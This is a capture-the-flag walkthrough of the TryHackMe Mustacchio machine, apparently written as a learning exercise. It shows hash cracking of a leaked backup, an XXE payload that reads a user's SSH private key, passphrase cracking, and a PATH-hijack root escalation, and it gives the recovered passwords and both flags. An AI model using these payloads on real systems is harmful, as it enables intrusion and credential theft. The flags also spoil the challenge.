---
title: 'TryHackMe - Mustacchio'
author: r2cook
categories: [TryHackMe]
tags: [ Steganography, steghide, hashid, hashcat, sqlite3, PrivEsc, pkexec, PwnKit]
render_with_liquid: false
media_subpath: /images/thm/Mustacchio/
image:
  path: room_card.png
---

> In this walkthrough, we compromise the TryHackMe **Mustacchio** machine by chaining **multi-service enumeration, web application analysis, credential recovery, secure-shell foothold acquisition, and Linux privilege escalation**, moving methodically from exposed application data to full root compromise while capturing both flags.

## Initial Setup

Add the target to your hosts file:

```plaintext
10.130.168.54 mustacchio.thm
```
{: file="/etc/hosts" }

---

## Enumeration

### Full Port Scan

```shell
nmap -p- -sV -sC -Pn --min-rate 1000 -oN full_nmap_scan.txt mustacchio.thm
```
{: .nolineno }

### Results

```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-30 05:33 EET  
Nmap scan report for mustacchio.thm (10.130.168.54)  
Host is up (0.056s latency).  
Not shown: 65532 filtered tcp ports (no-response)  
PORT     STATE SERVICE VERSION  
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)  
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)  
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)  
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))  
| http-robots.txt: 1 disallowed entry   
|_/  
|_http-server-header: Apache/2.4.18 (Ubuntu)  
|_http-title: Mustacchio | Home  
8765/tcp open  http    nginx 1.10.3 (Ubuntu)  
|_http-server-header: nginx/1.10.3 (Ubuntu)  
|_http-title: Mustacchio | Login  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
```
{: .nolineno }

### Enumeration Notes

The interesting attack surface is:

- `80/tcp` → main website
    
- `8765/tcp` → login portal
    
- `22/tcp` → possible SSH access after obtaining credentials or keys
    

---

## Web Portal Enumeration

![](Image_1.png){: width="800" height="400" .shadow }

After viewing the page source and navigating through CSS/JS files plus parent directories, we discovered a backup file under `/custom/` named:

```text
users.bak
```

![](Image_2.png){: width="800" height="400" .shadow }

![](Image_3.png){: width="800" height="400" .shadow }

Download the file and identify it:

```shell
wget http://mustacchio.thm/custom/users.bak
file users.bak
```
{: .nolineno }

The file appears to be an **SQLite database**.

Open it with SQLite:

```shell
sqlite3 users.bak
.tables
select * from users;
```
{: .nolineno }

or   with `DB Browser for SQLite`

Inside the `users` table, there is a single record.

![](Image_4.png){: width="800" height="400" .shadow }

Extracted credentials:

```text
username: admin
password hash: 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

---

## Hash Cracking

![](Image_5.png){: width="800" height="400" .shadow }

Identify/crack the hash:

```shell
hashid -m '1868e36a6d2b17d4c2745f1659433a54d4bc5f4b'
```
{: .nolineno }

Save the hash into a file for cracking:

```shell
echo '1868e36a6d2b17d4c2745f1659433a54d4bc5f4b' > hash.txt
```
{: .nolineno }

- `-m` specifies the **Hashcat mode**

Using `hashcat` 

```shell
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt
```
{: .nolineno }

Recovered password:

```text
bulldog19
```

So the login credentials are:

```text
admin:bulldog19
```

---

## Admin Panel Access

![](Image_6.png){: width="800" height="400" .shadow }

Successfully authenticated into the admin panel.

![](Image_7.png){: width="800" height="400" .shadow }
![](Image_8.png){: width="800" height="400" .shadow }

Viewing the page source reveals an important comment:

```html
<!-- Barry, you can now SSH in using your key!-->
```

This strongly suggests:

- Valid SSH user = `barry`
    
- SSH key authentication is likely required
    

A JavaScript comment also exposes another backup file:

```js
//document.cookie = "Example=/auth/dontforget.bak";
```

---

## XML Backup Analysis

Download the backup file:

```shell
wget http://mustacchio.thm:8765/auth/dontforget.bak
file dontforget.bak
```
{: .nolineno }

The file is XML.

![](Image_9.png){: width="800" height="400" .shadow }

Contents:

```xml
<?xml version="1.0" encoding="UTF-8"?>  
<comment>  
 <name>Joe Hamd</name>  
 <author>Barry Clad</author>  
 <com>his paragraph was a waste of time and space...</com>  
</comment>
```

This looks like the **template used by the admin comment system**.

---

## XXE Exploitation → SSH Private Key Read

Because the comment system accepts XML input and reflects it back, it is vulnerable to **XXE (XML External Entity Injection)**.

### XXE Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE comment [
  <!ENTITY test SYSTEM "file:///home/barry/.ssh/id_rsa">
]>
<comment>
  <name>aaaa</name>
  <author>Barry Clad</author>
  <com>&test;</com>
</comment>
```

Before exploiting, inspect the request in Burp Suite.


![](Image_10.png){: width="800" height="400" .shadow }

The request confirms the application handles **raw XML via POST**.


![](Image_11.png){: width="800" height="400" .shadow }

Submitting the XML template reflects it in the response, confirming XXE potential.


![](Image_12.png){: width="800" height="400" .shadow }


![](Image_13.png){: width="800" height="400" .shadow }

Now submit the malicious XXE payload.

![](Image_14.png){: width="800" height="400" .shadow }

Success — Barry’s SSH private key is disclosed.

Save it locally:

```shell
nano id_rsa
chmod 700 id_rsa
ssh-keygen -y -f id_rsa
```
{: .nolineno }

The key is passphrase-protected.

---

## Crack SSH Key Passphrase

Convert the key for John:

```shell
~/tools/john/run/ssh2john.py id_rsa > key.hash
~/tools/john/run/john key.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
{: .nolineno }

![](Image_15.png){: width="800" height="400" .shadow }

Recovered passphrase:

```text
urieljames
```

---

## Foothold (SSH Access)

Login as Barry:

```shell
ssh -i id_rsa barry@mustacchio.thm
```
{: .nolineno }

Use the passphrase:

```text
urieljames
```

![](Image_16.png){: width="800" height="400" .shadow }

Initial access obtained.

---

## Privilege Escalation  (PrivEsc)

Enumerate SUID binaries:

```shell
find / -perm -4000 -type f 2>/dev/null
```
{: .nolineno }

Interesting custom SUID binary:

```text
/home/joe/live_log
```

```shell
file /home/joe/live_log
```
{: .nolineno }

Output:

```text
/home/joe/live_log: setuid ELF 64-bit LSB shared object
```

This custom SUID binary is the likely privilege escalation vector.

### Exploit Idea

The binary calls `tail` without an absolute path, making it vulnerable to **PATH hijacking**.

### Exploit

```shell
cd /tmp
echo '/bin/bash -p' > tail
chmod +x tail
export PATH=/tmp:$PATH
/home/joe/live_log
```
{: .nolineno }

Root shell obtained:

```shell
id
```
{: .nolineno }

```text
uid=0(root) gid=0(root)
```

Full terminal session:

```shell
barry@mustacchio:~$ id  
uid=1003(barry) gid=1003(barry) groups=1003(barry)  
barry@mustacchio:~$ find / -perm -4000 -type f 2>/dev/null  
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic  
/usr/lib/eject/dmcrypt-get-device  
/usr/lib/policykit-1/polkit-agent-helper-1  
/usr/lib/snapd/snap-confine  
/usr/lib/openssh/ssh-keysign  
/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/usr/bin/passwd  
/usr/bin/pkexec  
/usr/bin/chfn  
/usr/bin/newgrp  
/usr/bin/at  
/usr/bin/chsh  
/usr/bin/newgidmap  
/usr/bin/sudo  
/usr/bin/newuidmap  
/usr/bin/gpasswd  
/home/joe/live_log  
/bin/ping  
/bin/ping6  
/bin/umount  
/bin/mount  
/bin/fusermount  
/bin/su  
barry@mustacchio:~$ file /home/joe/live_log  
/home/joe/live_log: setuid ELF 64-bit LSB shared object  
barry@mustacchio:~$ cd /tmp && echo '/bin/bash -p' > tail && chmod +x tail && export PATH=/tmp:$PATH && /home/joe/live_log  
root@mustacchio:/tmp# id  
uid=0(root) gid=0(root) groups=0(root),1003(barry)  
root@mustacchio:/tmp# cat /root/root.txt  
3223581420d906c4dd1a5f9b530393a5
```
{: .nolineno }

![](Image_17.png){: width="800" height="400" .shadow }

---

## Final Flags

### User Flag

Retrieve from Barry’s home directory:

```text
62d77a4d5f97d47c5aa38b3b2651b831
```

### Root Flag

```text
3223581420d906c4dd1a5f9b530393a5
```

---